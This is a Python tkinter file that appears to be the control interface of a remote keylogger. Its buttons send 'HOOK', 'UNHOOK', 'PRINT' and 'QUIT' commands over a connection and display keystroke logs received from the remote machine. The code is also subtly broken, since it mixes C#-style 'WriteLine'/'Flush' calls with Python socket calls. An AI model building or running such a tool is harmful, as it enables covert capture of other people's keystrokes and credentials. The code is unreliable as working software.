from tkinter import *
import socket
from Program import Program

class KeylogForm:
    def __init__(self, root):
        self.root = root
        self.initialize_components()

    def initialize_components(self):
        self.root.title("Keylog")
        self.button1 = Button(self.root, text="HOOK", command=self.hook)
        self.button1.pack()
        self.button2 = Button(self.root, text="UNHOOK", command=self.unhook)
        self.button2.pack()
        self.button3 = Button(self.root, text="PRINT", command=self.print_log)
        self.button3.pack()
        self.button4 = Button(self.root, text="QUIT", command=self.keylog_closing)
        self.button4.pack()
        self.txtKQ = Text(self.root)
        self.txtKQ.pack()
        self.butXoa = Button(self.root, text="Clear", command=self.clear_log)
        self.butXoa.pack()
        self.root.protocol("WM_DELETE_WINDOW", self.keylog_closing)

    def hook(self):
        s = "HOOK"
        Program.nw.WriteLine(s); Program.nw.Flush();

    def unhook(self):
        s = "UNHOOK"
        Program.nw.WriteLine(s); Program.nw.Flush();

    def print_log(self):
        s = "PRINT"
        Program.nw.WriteLine(s); Program.nw.Flush();

        data = Program.nr.recv(5000).decode()
        self.txtKQ.insert(END, data)

    def clear_log(self):
        self.txtKQ.delete(1.0, END)

    def keylog_closing(self):
        s = "QUIT"
        Program.nw.WriteLine(s); Program.nw.Flush();
        self.root.destroy()

if __name__ == "__main__":
    root = Tk()
    keylog_form = KeylogForm(root)
    root.mainloop()